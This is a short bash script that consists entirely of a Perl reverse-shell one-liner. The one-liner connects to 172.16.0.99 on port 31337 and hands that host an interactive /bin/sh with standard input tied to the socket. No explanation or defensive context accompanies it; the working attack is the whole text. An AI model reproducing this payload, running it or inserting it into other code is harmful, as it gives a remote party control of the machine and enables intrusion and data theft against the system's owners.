#!/bin/bash
perl -e 'use Socket;$i="172.16.0.99";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");exec("/bin/sh -i");'
